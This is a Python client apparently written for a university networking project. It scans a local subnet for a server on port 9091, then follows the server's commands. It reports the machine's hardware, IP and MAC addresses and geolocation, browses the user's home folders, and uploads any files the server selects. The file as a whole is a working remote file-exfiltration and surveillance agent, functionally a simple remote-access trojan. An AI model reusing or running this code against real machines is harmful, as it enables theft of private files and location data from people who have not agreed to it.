#  Progetto Reti - The Phantom Thieves of Hearts (Take your time)
#
#
#
#
#                                                                     ,,,,,,,,,,,
#                                                              ,,,,,,,,,,,,
#                                                         ,,,,,,,,,,,,, ,,,   ,
#                                                    ,,,,,,,,,,,,,,, ,, ,,,    ,
#                                                 ,,,,,,,,,,,,,,,,,,,,, ,,,, , ,
#                                              ,,,,,,,,,,,,,,,,,,,,,,,,, ,,,   ,.
#                                             ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,, ,,,
#                                           ,,,,,,,,,,,,,   ,,,,,,,,,,,,, ,,,,  ,
#                                           ,,,,,,,,,         ,,,,,,,,,,,, ,,,  ,,
#                                                            , ,,,,,,,,,,,,.,,,  ,
#                                                             ,,,,,,,,,,,,,,,,,, ,,                        @
#                                                               , ,,,,,,,,,,,,,,           ,
#                                                                , ,,,,,,,,,,, ,      ,,                      @@
#                                                                   ,,,,,,,,,,  ,, ,,        @@       ,     @
#                                                                    ,,,,,,, ,,,,,,      &@@   ,,,,,,,,   @@
#                                                                      ,, ,,,,,,,      @@@@ ,,,, @ ,,,  @@@
#                                                                     ,,,,,,, ,      @@@@@@,,,,@@ ,,,@@@@@
#                                                                 ,,,,,,,,,, ,    ,, @@@@@@@,, @@@@@@@@@(
#                                                                  ,,,,,,,,,,  @,,,,,@@@@@@@@ ,,,,,
#                                                                   ,,,,,,,,  @ ,,,,&@@@@@@ ,,,,,,,
#                                                       ,,,,,,       ,,,, ,  @@@@ @@@@@@@@@ ,, ,,,
#                                                  ,,,,,,,,,,,,       , ,,, @@@@@@@@@@@@@@@@@ ,,,
#                                                ,,,,,,,,,,,,,,,,      , , @@@@@@@@@@@@@@@  ,,,
#                                               ,,,,,,,,,,,,,,,,,,,,,,, ,,,,@@@@@@@@@ ,,,,,,,,
#                                                ,,,,,,,,,,,,,,,,,,,,  ,,,.@@@@@@@@@    @ ,,
#                                                   ,,,,,,,,, ,,,    ,,,,,@@@@@.@@@@@@, ,,
#                                                              @@@@   .,,, ,,,,,,,,,,,,,
#                                                                 @@   ,,,,,,,,,,,,,,,
#
#
#
#
#  Autori:
#  ALEX CIACCIARELLA    N86003179
#  STEFANO DE FENZA    N86003446
#  ELVINO BUONANNO      N86003302
#  GUGLIELMO DE BIASIO     N86003216
#

import json
import logging
import math
import platform
import re
import shutil
import signal
import socket
import time
import uuid
import threading
from datetime import datetime
import ipaddress
from pathlib import Path
import os
# imported Libraries
#import ipinfo
import psutil
from cpuinfo import get_cpu_info
import ipinfo
access_token = ''
IpAddr = ""
Port = 9091
info = {}
s = socket.socket()
connected = False

# For Threading
Connesso = True


def CreaSocket() -> bool:
    global s
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # socket Created
        print("Socket Created")
        return True
    except socket.error as e:
        logging.exception(e)
        return False


def Cliente() -> bool:
    global s, info

    req = s.recv(1024).decode()

    info = {}

    if req == '1':
        data = GetGeneralInfo()
        s.send(data)
        return True
    elif req == '2':  # CPU
        data = Cores()
        s.send(data)
        return True
    elif req == '3':  # RAM
        data = ram()
        s.send(data)
        return True
    elif req == '4':  # PARTITION
        data = Partizioni()
        s.send(data)
        return True
    elif req == '5':  # NETWORK
        data = Network()
        s.send(data)
        return True
    elif req == '6':  # GEOLOCATION
        data = Geolocation()
        s.send(data)
        return True
    elif req == '7':
        fileRetrieval()
        return True
    else:
        return False


def getTokenFromConnection():
    global s, connected
    while not connected:
        try:
            token = s.recv(14).decode()
            connected = True
            return token
        except socket.error as se:
            print("Error getting token from the socket. Retrying in 5 min")


def fileRetrieval():
    paths = getPaths()
    s.send(paths.encode())
    file_numbers = scanDir()
    s.send(file_numbers)
    status = s.recv(1092).decode("utf-8")
    if status == "quit":
        return
    uploaderFunction()

def main():
    global access_token
    resp = True

    CreaSocket()
    #Socket Appena Creato

    mainThreadingFunction()
    #Se esce da qui ha trovato il server

    access_token = getTokenFromConnection()
    #token mandato al server per l'ip

    #Richieste per le infor di sistema
    while resp:
        resp = Cliente()
    if not resp:
        print("Connection Closed by the server")


def General():
    global info
    try:
        os_name = platform.system()
        version = platform.version()
        info['os'] = f"{os_name} - v. {version}"
        info['hostname'] = socket.gethostname()
        boot_time_timestamp = psutil.boot_time()
        bt = datetime.fromtimestamp(boot_time_timestamp)
        info['Boot time'] = str(f"{bt.year}/{bt.month}/{bt.day} {bt.hour}:{bt.minute}:{bt.second}")
    except Exception as e:
        logging.exception(e)


def Cores():
    global info
    try:
        cpu_name = get_cpu_info()['brand_raw']
        cpu_family = platform.processor()
        info['processor'] = f"{cpu_name} - {cpu_family}"
        physical_cores = psutil.cpu_count(logical=False)
        total_cores = psutil.cpu_count(logical=True)
        info['cores'] = f"Physical Cores: {physical_cores} - Total Cores: {total_cores}"
        cpufreq = psutil.cpu_freq()
        info['Cpu Frequency'] = f"Current Frequency: {cpufreq.current} - Max Frequency: {cpufreq.max}"
    except Exception as e:
        logging.exception(e)
    return json.dumps(info, indent=4).encode("utf-8")


def ram():
    global info
    try:
        info['ram'] = convertRam(
            psutil.virtual_memory().total)
        return json.dumps(info, indent=4).encode("utf-8")
    except Exception as e:
        logging.exception(e)


def convertRam(size_bytes):
    if size_bytes == 0:
        return "0B"
    size_name = ("B", "KB", "MB", "GB", "TB", "PB", "EB", "ZB", "YB")
    i = int(math.floor(math.log(size_bytes, 1024)))
    p = math.pow(1024, i)
    s = round(size_bytes / p, 2)
    return "%s %s" % (s, size_name[i])


def Partizioni():
    global info
    try:
        total, used, free = shutil.disk_usage("/")

        info['Total Disk Memory'] = "Total: %d GiB" % (total // (2 ** 30))
        info['Used Disk Memory'] = "Used: %d GiB" % (used // (2 ** 30))
        info['Free Disk Memory'] = "Free: %d GiB" % (free // (2 ** 30))
        return json.dumps(info, indent=4).encode("utf-8")
    except Exception as e:
        logging.exception(e)


def Network():
    global info
    try:
        handler = ipinfo.getHandler(access_token)
        details = handler.getDetails()
        info['ip-address'] = details.ip
        info['mac-address'] = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        return json.dumps(info, indent=4).encode("utf-8")
    except Exception as e:
        logging.exception(e)


def Geolocation():
    global info
    try:
        handler = ipinfo.getHandler(access_token)
        details = handler.getDetails()
        city = details.city
        region = details.region
        country = details.country
        postal = details.postal
        location = details.loc
        ISP = details.org
        info['Location'] = f"{city}, {region}, {country}, postal code : {postal}"
        info['Latitude and Logitude'] = f"{location}"
        info['Internet ISP'] = f"{ISP}"
        return json.dumps(info, indent=4).encode("utf-8")
    except Exception as e:
        print(f"Errore nel retrivial della location del computer : {logging.error(e)}")


def IsConnected() -> bool:
    try:
        host = "1.1.1.1"
        host = socket.gethostbyname(host)
        s = socket.create_connection((host, 80), 2)
        s.close()
        return True
    except Exception as e:
        return False


def GetGeneralInfo():
    global info

    General()
    Cores()
    ram()
    Partizioni()
    if IsConnected():
        Network()
        Geolocation()

    return json.dumps(info, indent=4).encode("utf-8")

"""def getPaths():
    print("sono entrato in getPaths")
    Relative_path = str(Path.home()) + '/.config/user-dirs.dirs'  #/home/$USER/.config/user-dirs.dirs
    print(Relative_path)  #secondo print
    count = 1
    with open(Relative_path ,'r') as file: #open file and when scope is ended, automatically close it
        path_dict = {}
        for i  in file.read().splitlines():   #read file row by row
            if i.startswith("XDG"):   #if string starts with XDG...
                x = i.split("$HOME/")  #only get second part of "$HOME/..."  (gets the final " too)
                path_dict[f"{count}) {x[1][:-1]}"] =  str(Path.home()) + "/" + x[1][:-1]
                count += 1

    return json.dumps(path_dict,indent=4).encode("utf-8")"""

def getPaths():
    home = Path.home()
    dictionary = {}
    count = 1
    for root, dirs, filenames in os.walk(home):
        for d in dirs:
            if not d.startswith("."):
                dictionary[f"{count}) {d}"] = os.path.join(home, d)
                count += 1
        break  # prevent descending into subfolders

    return json.dumps(dictionary)

def scanDir():
    input = s.recv(1092).decode()
    input = input.replace('"','')
    input = input.replace(" ", "")
    count = 1
    file_number = []
    for root, dir, files in os.walk(input):
        for file in files:
            file_number.append(os.path.join(root,file))
            count += 1

    return json.dumps(file_number).encode("utf-8")

def uploaderFunction():
   found_files = recvall(s).decode()
   found_files = json.loads(found_files)   #lista dei file trovati nel path scelto

   time.sleep(3)

   files_by_number = s.recv(8192).decode()
   files_by_number = json.loads(files_by_number)    #lista dei file da scaricare

   amount_of_files = len(files_by_number)

   s.send(str(amount_of_files).encode("utf-8"))

   for i in files_by_number:
       file_to_open = str(found_files[i-1])
       with open(file_to_open, 'rb') as file_to_send:
           file_info_struct = os.stat(file_to_open)
           file_size = file_info_struct.st_size
           s.send(str(file_size).encode("utf-8"))  # filesize
           s.send(file_to_open.encode("utf-8","ignore"))
           s.recv(100).decode("utf-8")
           file_data = file_to_send.read()
           s.sendall(file_data)
           s.recv(1092).decode("utf-8")

def recvall(sock):
    BUFF_SIZE = 4096
    data = b''
    while True:
        part = sock.recv(BUFF_SIZE)
        data += part
        if len(part) < BUFF_SIZE:
            break    # 0 bit da scaricare o end of file
    return data

def signal_handler(signal, frame):
    print("Keyboard Interrupt received: closing connection...")
    s.close()
    exit(0)


#  --------------------------------THREADING AND IP CHECKING FUNCTIONS--------------------------------------------------


def mainThreadingFunction():
    print("Scannerizzo gli ip della sottorete per trovare quello del server...")
    ricerca = False

    list1 = splitter()

    cerca(ricerca, list1)
    print(f"Sono riuscito a trovare un Server con indirizzo {IpAddr}")


def cerca(ricerca, list1):
    while not ricerca:
        retry = loop(list1)
        if retry == False:
            ricerca = True

        while retry:
            if Connesso == True:
                print("Nessun thread ha trovato l'ip giusto, vuoi riprovare a cercare?")
                print("1)Si")
                print("2)No")
                riprova = input()
                if riprova == '1':
                    pass
                elif riprova == '2':
                    retry = False
                    ricerca = True
                else:
                    print("Inserisci un numero corretto")


def loop(lista):
    global Connesso, IpAddr, exitflag1
    retry = True
    for i in lista:
        if Connesso == True and s.connect_ex((socket.gethostbyname(str(i)), Port)) == 0:#checkConnection(i):
            print(f"Sono riuscito a connettermi a {i} ")
            IpAddr = str(i)
            retry = False
            return retry
        elif not Connesso:
            pass
        else:
            print(f"Non sono riuscito a connettermi a {i} ")
    return retry



def splitter():
    numberlist = []
    for i in range(177, 180):
        numberlist.append(f"192.168.1.{i}")
    return numberlist

if __name__ == "__main__":
    signal.signal(signal.SIGINT, signal_handler)
    main()
